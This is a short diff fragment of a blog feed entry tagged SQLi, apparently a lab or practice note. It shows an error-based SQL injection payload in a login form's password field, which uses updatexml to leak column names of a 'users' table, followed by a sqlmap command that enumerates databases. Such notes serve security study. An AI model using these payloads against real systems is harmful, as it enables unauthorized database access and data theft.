+<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -r 1.txt --batch --dbs</code></p>
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
       </tags>
   </entry>
   <entry>
